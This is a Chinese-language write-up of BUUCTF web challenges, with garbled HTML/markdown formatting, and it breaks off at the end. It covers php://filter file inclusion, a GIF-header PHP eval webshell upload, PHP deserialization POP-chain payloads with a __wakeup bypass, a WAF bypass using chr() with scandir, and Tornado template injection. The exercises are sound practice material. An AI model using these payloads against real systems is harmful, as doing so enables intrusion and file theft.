href="#下一关直接给了源代码，源代码里面有include函数，并且说了flag在flag-php中，所以判断为用-filter读取源代码，构造-file-php-filter-read-convert-base64-encode-resource-flag-php-这里base编码是为了把注释也读取出来，不然直接读取源代码看不到注释-，读取出来解码即可。" class="headerlink" title="下一关直接给了源代码，源代码里面有include函数，并且说了flag在flag.php中，所以判断为用:&#x2F;&#x2F;filter读取源代码，构造?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php(这里base编码是为了把注释也读取出来，不然直接读取源代码看不到注释)，读取出来解码即可。"></a>下一关直接给了源代码，源代码里面有include函数，并且说了flag在flag.php中，所以判断为用:&#x2F;&#x2F;filter读取源代码，构造?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php(这里base编码是为了把注释也读取出来，不然直接读取源代码看不到注释)，读取出来解码即可。</h2><p><img src="https://pics.lwzheng.tech/2024/12/27/676e8549a2e8a.png" alt="9923e0d3e34d05ca5bc7fb5d2d774c27.png"></p>
<h1 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h1><h2 id="这是一道文件上传题，先上传个-php文件看看情况，发现回显not-image，判断可能是MIME绕过，所以BP抓包后改content-type为image-png即可，回显变为“not！php！”，显然是过滤了php的后缀，可以试试大小写绕过或者用-phtml试试，发现前者也不行，但-phtml回显发生变化，变为不能有“《script-language-’php’》-eval-POST-‘a’-《-script》"><a href="#这是一道文件上传题，先上传个-php文件看看情况，发现回显not-image，判断可能是MIME绕过，所以BP抓包后改content-type为image-png即可，回显变为“not！php！”，显然是过滤了php的后缀，可以试试大小写绕过或者用-phtml试试，发现前者也不行，但-phtml回显发生变化，变为不能有“《script-language-’php’》-eval-POST-‘a’-《-script》" class="headerlink" title="这是一道文件上传题，先上传个.php文件看看情况，发现回显not image，判断可能是MIME绕过，所以BP抓包后改content-type为image&#x2F;png即可，回显变为“not！php！”，显然是过滤了php的后缀，可以试试大小写绕过或者用.phtml试试，发现前者也不行，但.phtml回显发生变化，变为不能有“《script language&#x3D;’php’》@eval($_POST[‘a’]);《&#x2F;script》"></a>这是一道文件上传题，先上传个.php文件看看情况，发现回显not image，判断可能是MIME绕过，所以BP抓包后改content-type为image&#x2F;png即可，回显变为“not！php！”，显然是过滤了php的后缀，可以试试大小写绕过或者用.phtml试试，发现前者也不行，但.phtml回显发生变化，变为不能有“《script language&#x3D;’php’》@eval($_POST[‘a’]);《&#x2F;script》</h2><h2 id="上传后回显发生变化，显示不完全是image，判断可能是文件头检测，需要上传图片马，可以用之前新生赛的一道题一样的方法直接制作图片马，也可以直接加文件头比如gif的文件头GIF89a，上传成功，但是仅仅告诉了我们上传文件名而没有告诉路径，猜测可能是默认上传路径-upload-xxx-phtml，访问后发现文件头还在，但是代码消失，说明代码被执行，蚁剑连接即可。"><a href="#上传后回显发生变化，显示不完全是image，判断可能是文件头检测，需要上传图片马，可以用之前新生赛的一道题一样的方法直接制作图片马，也可以直接加文件头比如gif的文件头GIF89a，上传成功，但是仅仅告诉了我们上传文件名而没有告诉路径，猜测可能是默认上传路径-upload-xxx-phtml，访问后发现文件头还在，但是代码消失，说明代码被执行，蚁剑连接即可。" class="headerlink" title="上传后回显发生变化，显示不完全是image，判断可能是文件头检测，需要上传图片马，可以用之前新生赛的一道题一样的方法直接制作图片马，也可以直接加文件头比如gif的文件头GIF89a，上传成功，但是仅仅告诉了我们上传文件名而没有告诉路径，猜测可能是默认上传路径&#x2F;upload&#x2F;xxx.phtml，访问后发现文件头还在，但是代码消失，说明代码被执行，蚁剑连接即可。"></a>上传后回显发生变化，显示不完全是image，判断可能是文件头检测，需要上传图片马，可以用之前新生赛的一道题一样的方法直接制作图片马，也可以直接加文件头比如gif的文件头GIF89a，上传成功，但是仅仅告诉了我们上传文件名而没有告诉路径，猜测可能是默认上传路径&#x2F;upload&#x2F;xxx.phtml，访问后发现文件头还在，但是代码消失，说明代码被执行，蚁剑连接即可。</h2><p><img src="https://pics.lwzheng.tech/2024/12/28/676f8e9d1d876.png" alt="4464f14823a50ca624e3b3ee2bdff2fd.png"></p>
<h1 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h1><h2 id="首先看到页面上备份网站的字样，想到可能有备份文件，所以用dirsearch扫描一下，得到www-zip这个备份文件，dirsearch命令为"><a href="#首先看到页面上备份网站的字样，想到可能有备份文件，所以用dirsearch扫描一下，得到www-zip这个备份文件，dirsearch命令为" class="headerlink" title="首先看到页面上备份网站的字样，想到可能有备份文件，所以用dirsearch扫描一下，得到www.zip这个备份文件，dirsearch命令为"></a>首先看到页面上备份网站的字样，想到可能有备份文件，所以用dirsearch扫描一下，得到<a target="_blank" rel="noopener" href="http://www.zip这个备份文件,dirsearch命令为/">www.zip这个备份文件，dirsearch命令为</a></h2><blockquote>
<p>python dirsearch.py -u <a target="_blank" rel="noopener" href="http://374085ee-48bf-40e5-acf4-9bd53e66bfb3.node5.buuoj.cn:81/">http://374085ee-48bf-40e5-acf4-9bd53e66bfb3.node5.buuoj.cn:81/</a> -e php,jsp,asp -x 400-500<br>-u	            指定url<br>-e 语言	         指定网站语言，一般用-e*即所有语言<br>-i	            保留响应状态码(不同状态码用逗号分隔，可指定范围，如-i 200,300-400)<br>-x	            排除响应状态码(不同状态码用逗号分隔，可指定范围，如-x 400,400-500)<br>-w	            指定字典<br>-r	            递归目录(即可扫描新扫描出的目录下的目录)<br>-random-agents	使用随机User-Agent</p>
</blockquote>
<h2 id="然后下载备份文件，得到flag-php-class-php-index-php三个文件，flag-php里面是假flag，class-php里面是一个类的定义，并且包含了flag-php，还有很多魔术方法，再看index-php文件，里面包含了class-php，还有反序列化函数unserialize-判断为php反序列化类型的题"><a href="#然后下载备份文件，得到flag-php-class-php-index-php三个文件，flag-php里面是假flag，class-php里面是一个类的定义，并且包含了flag-php，还有很多魔术方法，再看index-php文件，里面包含了class-php，还有反序列化函数unserialize-判断为php反序列化类型的题" class="headerlink" title="然后下载备份文件，得到flag.php,class.php,index.php三个文件，flag.php里面是假flag，class.php里面是一个类的定义，并且包含了flag.php，还有很多魔术方法，再看index.php文件，里面包含了class.php，还有反序列化函数unserialize.判断为php反序列化类型的题."></a>然后下载备份文件，得到flag.php,class.php,index.php三个文件，flag.php里面是假flag，class.php里面是一个类的定义，并且包含了flag.php，还有很多魔术方法，再看index.php文件，里面包含了class.php，还有反序列化函数unserialize.判断为php反序列化类型的题.</h2><h2 id="首先了解一下魔术方法"><a href="#首先了解一下魔术方法" class="headerlink" title="首先了解一下魔术方法"></a>首先了解一下魔术方法</h2><blockquote>
<p>__construct：当对象被创建时调用<br>__destruct：当对象被销毁前调用<br>__sleep：执行serialize函数前调用<br>__wakeup：执行unserialize函数前调用<br>__call：在对象中调用不可访问的方法时调用<br>__callStatic：用静态方法调用不可访问方法时调用<br>__get：获得类成因变量时调用<br>__set：设置类成员变量时调用</p>
</blockquote>
<h2 id="反序列化漏洞就是通过这些自动调用的魔术方法来控制这些函数里面危险的命令"><a href="#反序列化漏洞就是通过这些自动调用的魔术方法来控制这些函数里面危险的命令" class="headerlink" title="反序列化漏洞就是通过这些自动调用的魔术方法来控制这些函数里面危险的命令"></a>反序列化漏洞就是通过这些自动调用的魔术方法来控制这些函数里面危险的命令</h2><h2 id="然后让我们进行代码审计，index-php中get了一个我们可以控制的变量select，并将其进行反序列化，所以如果我们把select设置为提前系列化的pop链，并将其中Name类的对象参数设置的符合class-php中-destruct的要求，我们就能得到flag。"><a href="#然后让我们进行代码审计，index-php中get了一个我们可以控制的变量select，并将其进行反序列化，所以如果我们把select设置为提前系列化的pop链，并将其中Name类的对象参数设置的符合class-php中-destruct的要求，我们就能得到flag。" class="headerlink" title="然后让我们进行代码审计，index.php中get了一个我们可以控制的变量select，并将其进行反序列化，所以如果我们把select设置为提前系列化的pop链，并将其中Name类的对象参数设置的符合class.php中__destruct的要求，我们就能得到flag。"></a>然后让我们进行代码审计，index.php中get了一个我们可以控制的变量select，并将其进行反序列化，所以如果我们把select设置为提前系列化的pop链，并将其中Name类的对象参数设置的符合class.php中__destruct的要求，我们就能得到flag。</h2><blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br></pre></td><td class="code"><pre><span class="line">   class Name&#123;</span><br><span class="line">       private `$`username = &#x27;admin&#x27;;</span><br><span class="line">       private `$`password = &#x27;100&#x27;;</span><br><span class="line">   &#125;</span><br><span class="line">   `$`flag=new Name(&#x27;admin&#x27;,&#x27;100&#x27;);</span><br><span class="line">   print_r(serialize($flag));</span><br><span class="line">?》```</span><br><span class="line">`O:4:&quot;Name&quot;:2:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;&#125;   `    (因为是private所以手动在Name两边补%00)</span><br><span class="line"></span><br><span class="line">## 运行上面的代码，将输出传入select中，发现`__wakeup()`破坏了我们的想法，他将usename设置为了guest，所以我们要想办法绕过这个函数，当序列化对象中的成员数大于实际成员数时，就可以绕过`__wakeup()`函数.所以最终的payload为:</span><br><span class="line">&gt;`?select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;&#125;   `</span><br><span class="line"></span><br><span class="line">![0a5bd032-8230-4102-a7a8-461b635031f5.png](https://pics.lwzheng.tech/2024/12/31/67738b9f711f1.png)</span><br><span class="line">## 得到flag</span><br><span class="line"></span><br><span class="line"># [RoarCTF 2019]Easy Calc</span><br><span class="line">## 打开网站惯例先看看源代码，看到有一句提示说有WAF（防火墙），然后看到calc.php?num=&quot;+encodeURIComponent($(&quot;#content&quot;).val())这一段代码，前面是calc.php这个php文件get了一个num的参数，后面要把输入的content进行ASCII编码</span><br><span class="line">&gt;encodeURIComponent() 函数可把字符串作为 URI 组件进行编码。 该方法不会对 ASCII</span><br><span class="line">字母和数字进行编码，也不会对这些 ASCII 标点符号进行编码： - _ . ! ~ * ’ ( ) 。</span><br><span class="line">`$`(&quot;#content&quot;)得到的是一个对象</span><br><span class="line">`$`(&quot;#content&quot;).val()得到的是这个对象的内容</span><br><span class="line"></span><br><span class="line">## 然后顺其自然的就访问calc.php看看，内容是源代码，有blacklist黑名单过滤，先随便输入了一些没有被显式过滤的字母，发现被WAF检测到，直接无权访问，去了解了一下WAF绕过方式，发现可以在get变量名前加空格%20来绕过</span><br><span class="line">&gt;如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：</span><br><span class="line">/news.php?%20news[id%00=42&quot;+AND+1=0–</span><br><span class="line">上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。</span><br><span class="line">PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</span><br><span class="line">1.删除空白符</span><br><span class="line">2.将某些字符转换为下划线（包括空格)</span><br><span class="line"></span><br><span class="line">## 所以只要?%20num=即可，接下来该怎么做呢</span><br><span class="line">&gt;file_get_contents():把整个文件读入一个字符串中.该函数是用于把文件的内容读入到一个字符串中的首选方法。如果服务器操作系统支持，还会使用内存映射技术来增强性能。</span><br><span class="line">scandir():列出指定路径中的文件和目录,scandir ( string $directory [, int $sorting_order [, resource $context ]] ) : array 返回一个 array，包含有 directory 中的文件和目录。</span><br><span class="line">print_r()：print_r() 函数用于打印变量，以更容易理解的形式展示。</span><br><span class="line">chr():chr(ascii码值)=ascii码值对应的字符</span><br><span class="line"></span><br><span class="line">## 有了这些函数我们就可以寻找flag了，首先先看看根目录下有什么文件，用print_r(scandir（/）)这个函数查询，但是发现/在黑名单中，所以用到chr函数，用chr（47）代替/，所以payload为?%20num=print_r(scandir(chr(47))),得到目录。</span><br><span class="line">![d290eb6a-b8a9-4c8b-b869-a4e8396442b0.png](https://pics.lwzheng.tech/2025/01/02/67762a4c74b8f.png)</span><br><span class="line">## 接下来就是要得到f1agg里面的内容了，运用print_r(file_get_contents(/f1agg)),但是还是用chr函数将/f1agg进行表示，转换为ascii码值后payload为?%20num=print_r(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))，得到flag。</span><br><span class="line">![6b7819af-c9fc-48be-9b76-e150a673b115.png](https://pics.lwzheng.tech/2025/01/02/67762b79c3aba.png)</span><br><span class="line"></span><br><span class="line"># [护网杯 2018]easy_tornado</span><br><span class="line">## 打开环境后有3个超链接，/flag.txt里面说flag在/fllllllllllllag文件中，同时观察url中有两个参数分别为?filename和?filehash，方便为文件和文件哈希值，将/flag.txt替换为/fllllllllllllag后显示error，同时参数变为?msg=error，同时联系题目的tornado判断为tornado模板注入。</span><br><span class="line">## 然后打开/welcome.txt,没什么信息</span><br><span class="line">## 最后打开/hint.txt，里面写了一段表达式一样的东西md5(cookie_secret+md5(filename))，同时有md5函数，判断可能为哈希值计算方式，所以只要知道了cookie_secret这个秘钥就能访问了。</span><br><span class="line">&gt;模板注入必须通过传输型如`&#123;&#123;xxx&#125;&#125;`的执行命令</span><br><span class="line">在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，handler 指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，这里面就是我们的一些环境变量。</span><br><span class="line">简单理解handler.settings即可，可以把它理解为tornado模板中内置的环境配置信息变量，通过handler.settings可以访问到环境配置的一些信息，看到tornado模板基本上可以通过handler.settings一把梭。</span><br><span class="line"></span><br><span class="line">## 所以将error界面的url改为`?msg=error&#123;&#123;handler.settings&#125;&#125;`即可访问到环境配置信息，这里面就有我们想要的秘钥。</span><br><span class="line">![6ebf26842365fa74e71f193c92bb961b.png](https://pics.lwzheng.tech/2025/01/07/677cf582159ba.png)</span><br><span class="line">## 用了秘钥，接下来按照表达式的方式计算hash值即可</span><br><span class="line">&gt;hash=MD5(d1735122-9df6-46bc-a3fe-7489f222268d+MD5(/fllllllllllllag))</span><br><span class="line"></span><br><span class="line">## 访问file?filename=/fllllllllllllag&amp;filehash=ce3938236541fbdca83f799f3502905d即可拿到flag。</span><br><span class="line"></span><br><span class="line"># [ZJCTF 2019]NiZhuanSiWei</span><br><span class="line">![b138e4fb-dc46-44d1-ae16-b5bdfa77c574.png](https://pics.lwzheng.tech/2025/01/07/677d12e4ed36e.png)</span><br><span class="line">## 首先打开网站后源代码直接有，进行代码审计，首先get了3个参数，第一个if检验是否传入text同时用file_get_contents读取text指向的文件的内容检验是否等于`welcome to the zjctf`</span><br><span class="line">## file_get_contents函数在我们不知道网站内部有什么可以利用的文件时一般用伪协议进行绕过，这里可以用php://input让他读取post数据流里面的数据，我们再post一个`welcome to the zjctf`就可以了</span><br><span class="line">## 第二层检验是检测file里面是否有flag字样，如果没有，就进行include包含，显而易见是文件包含漏洞，同时注释给了useless.php这个提示，显然是想让我们通过文件包含漏洞将useless.php给包含进来并显示，所以用filter伪协议?file=php://filter/read=convert.base64-encode/resource=useless.php，得到源代码的base64值，解码出来得到useless的源代码。</span><br><span class="line">&gt;```《?php  </span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line">   public $file;  </span><br><span class="line">   public function __tostring()&#123;  </span><br><span class="line">       if(isset($this-&gt;file))&#123;  </span><br><span class="line">           echo file_get_contents($this-&gt;file); </span><br><span class="line">           echo &quot;&quot;;</span><br><span class="line">       return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">       &#125;  </span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">?》```</span><br><span class="line"></span><br><span class="line">## 同时下面还有反序列化函数unserialize,结合useless里面的类定义，判断为反序列化漏洞，所以根据useless.php里面的flag.php注释，判断可能要把flag.php通过function __tostring的file_get_contents函数给echo出来，所以构造php函数</span><br><span class="line">&gt;```《?php  </span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line">   public `$`file=&#x27;flag.php&#x27;;  </span><br><span class="line">   public function __tostring()&#123;  </span><br><span class="line">       if(isset(`$`this-&gt;file))&#123;  </span><br><span class="line">           echo file_get_contents(`$`this-&gt;file); </span><br><span class="line">           echo &quot;&quot;;</span><br><span class="line">       return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">       &#125;  </span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">   `$`password=new Flag();</span><br><span class="line">   print_r(serialize(`$`password));</span><br><span class="line">?》```</span><br><span class="line"></span><br><span class="line">## 得到输出为`O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; `，所以将这个值get给password变量即可，同时因为我们不再需要二次打印useless.php的内容，仅仅只要包含就行，所以可以将file的伪协议去掉改为单独的useless.php,所以最终的payload为`/?text=php://input&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;`同时POST`welcome to the zjctf`。</span><br><span class="line">![47ad9051b0f7a87b7768af6f87d88ca2.png](https://pics.lwzheng.tech/2025/01/07/677d1646e1fa1.png)</span><br><span class="line"></span><br><span class="line"># [网鼎杯 2020 青龙组]AreUSerialz</span><br><span class="line">![04bb0193-7c15-4ffd-adcd-73614acbb20c.png](https://pics.lwzheng.tech/2025/01/08/677e358b1bd48.png)</span><br><span class="line">## 首先先代码审计，代码包含了一个flag.php的文件，猜测flag可能在其中，接下来定义了一个类，同时里面有__construct和__destruct两个魔术方法，又定义了一个is_valid函数来判断一个字符串里面的字符是否都满足ascii码值是不是都在[32,125]这个区间内，查看ascii码表发现[32,125]这个区间内的都是可打印字符，最后主函数里面先用is_valid函数检测get的字符串，然后再反序列化，显而易见是一个反序列化漏洞。</span><br><span class="line">## 接下来就是思考如何构造pop链了，首先寻找能够输出信息的突破口</span><br><span class="line"> ```  private function output($s) &#123;</span><br><span class="line">       echo &quot;[Result]: &quot;;</span><br><span class="line">       echo $s;```</span><br><span class="line"></span><br><span class="line">## 显而易见就是这个输出函数了，那么那一个函数能调用这个函数呢</span><br><span class="line">  ``` public function process() &#123;</span><br><span class="line">       if(`$`this-&gt;op == &quot;1&quot;) &#123;</span><br><span class="line">           `$`this-&gt;write();</span><br><span class="line">       &#125; else if($this-&gt;op == &quot;2&quot;) &#123;</span><br><span class="line">           `$`res = $this-&gt;read();</span><br><span class="line">           `$`this-&gt;output($res);</span><br><span class="line">       &#125; else &#123;</span><br><span class="line">           $this-&gt;output(&quot;Bad Hacker!&quot;);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   private function write() &#123;</span><br><span class="line">       if(isset(`$`this-&gt;filename) &amp;&amp; isset(`$`this-&gt;content)) &#123;</span><br><span class="line">           if(strlen((string)`$`this-&gt;content) &gt; 100) &#123;</span><br><span class="line">               `$`this-&gt;output(&quot;Too long!&quot;);</span><br><span class="line">               die();</span><br><span class="line">           &#125;</span><br><span class="line">           `$`res = file_put_contents(`$`this-&gt;filename, `$`this-&gt;content);</span><br><span class="line">           if(`$`res) $this-&gt;output(&quot;Successful!&quot;);</span><br><span class="line">           else `$`this-&gt;output(&quot;Failed!&quot;);</span><br><span class="line">       &#125; else &#123;</span><br><span class="line">           `$`this-&gt;output(&quot;Failed!&quot;);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;```</span><br><span class="line"></span><br><span class="line">## 我们发现这两个函数里面都有调用，但是观察write函数里面都是以固定字符串调用output函数，所以并没有利用价值，所以将重点放在process函数上，在第二个条件中，我们能output一个变量，这个变量是通过read函数生成的，所以我们转到read函数</span><br><span class="line">``` private function read() &#123;</span><br><span class="line">       `$`res = &quot;&quot;;</span><br><span class="line">       if(isset(`$`this-&gt;filename)) &#123;</span><br><span class="line">           `$`res = file_get_contents(`$`this-&gt;filename);</span><br><span class="line">       &#125;</span><br><span class="line">       return `$`res;</span><br><span class="line">   &#125;```</span><br><span class="line"></span><br><span class="line">## 这个函数是通过file_get_contents这一个读取文件写入功能的函数处理filename并返回的，加上一开始包含的flag.php的提示，判断应该是要用filter伪协议来读取flag.php里面的数据了，如果我们将filename的值设置为php://filter/read=convert.base64-encode/resource=flag.php，就可以利用file_get_contents函数得到flag.php里面的内容了。</span><br><span class="line">## 接下来要解决的问题就是如何满足process函数的第二个条件了，条件要求op=2，所以令op=2，然后再想办法执行process函数即可，</span><br><span class="line">```   function __construct() &#123;</span><br><span class="line">      ` $`op = &quot;1&quot;;</span><br><span class="line">       `$`filename = &quot;/tmp/tmpfile&quot;;</span><br><span class="line">       `$`content = &quot;Hello World!&quot;;</span><br><span class="line">       `$`this-&gt;process();</span><br><span class="line">   &#125;</span><br><span class="line">   function __destruct() &#123;</span><br><span class="line">       if(`$`this-&gt;op === &quot;2&quot;)</span><br><span class="line">          ` $`this-&gt;op = &quot;1&quot;;</span><br><span class="line">       `$`this-&gt;content = &quot;&quot;;</span><br><span class="line">       `$`this-&gt;process();</span><br><span class="line">   &#125;```</span><br><span class="line"></span><br><span class="line">## 我们发现这两个魔术方法中都有process函数，但是因为__construct在本地构造序列化字符串时候就已经执行了，在服务器上面不会执行__construct,所以我们关注__destruct函数，这里面会检测op是否等于2，如果等于就会将其变为1，所以为了在执行process时op=2，我们就要绕过这个检测，仔细对比process函数条件和__destruct函数条件，发现process为弱比较，__destruct为强比较，所以我们可以通过数字2来绕过与字符串2的比较，从而绕过op=1的命令。</span><br><span class="line">## 到这里就得到pop链为__destruct()-&gt;process(op==2)-&gt;read()-&gt;output()</span><br><span class="line">&gt;```《?php</span><br><span class="line">class FileHandler &#123;</span><br><span class="line">   protected `$`op=2;</span><br><span class="line">   protected `$`filename=&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;;</span><br><span class="line">   protected `$`content;</span><br><span class="line">&#125;</span><br><span class="line">   `$`flag=new FileHandler();</span><br><span class="line">   print_r(serialize(`$`flag));</span><br><span class="line">?》```</span><br><span class="line">`O:11:&quot;FileHandler&quot;:3:&#123;s:5:&quot;%00*%00op&quot;;i:2;s:11:&quot;%00*%00filename&quot;;s:52:&quot;php://filter/convert.base64-encode/resource=flag.php&quot;;s:10:&quot;%00*%00content&quot;;N;&#125;`</span><br><span class="line"></span><br><span class="line">![dc19251f-59e9-40f8-a227-405746a34d94.png](https://pics.lwzheng.tech/2025/01/08/677e3b9192a76.png)</span><br><span class="line">## 这里发现%00并不满足is_valid函数的条件，所以无法执行反序列化，为了绕过，可以利用php7.1以上的版本对属性类型不敏感，所以可以将属性改为public，public属性序列化不会出现不可见字符。</span><br><span class="line">&gt;```《?php</span><br><span class="line">class FileHandler &#123;</span><br><span class="line">   public `$`op=2;</span><br><span class="line">   public `$`filename=&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;;</span><br><span class="line">   public `$`content;</span><br><span class="line">&#125;</span><br><span class="line">   `$`flag=new FileHandler();</span><br><span class="line">   print_r(serialize(`$`flag));</span><br><span class="line">?》```</span><br><span class="line">`O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:52:&quot;php://filter/convert.base64-encode/resource=flag.php&quot;;s:7:&quot;content&quot;;N;&#125;`</span><br><span class="line"></span><br><span class="line">![1f5cd4f8-8477-4d34-aaf7-03c46ede981f.png](https://pics.lwzheng.tech/2025/01/08/677e3c9c047cf.png)</span><br><span class="line">## 这样就得到flag.php的base64编码值了，解码即可得到flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># [RoarCTF 2019]Easy Java</span><br><span class="line">## 打开是一个登录页面，里面有个help的超链接，打开后发现下载不了，发现是get请求的，尝试post请求，发现成功下载，打开help文件发现没有flag，但是这个下载成功的目的是为了让我们知道这是个文件下载漏洞，我们可以通过download页面随意下载网页的文件，里面有一些配置文件就很有可能包含重要信息</span><br><span class="line">&gt;Java中的重要文件：</span><br><span class="line">/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则</span><br><span class="line">/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中 </span><br><span class="line">/WEB-INF/database.properties：数据库配置文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;Servlet（Server Applet），全称Java 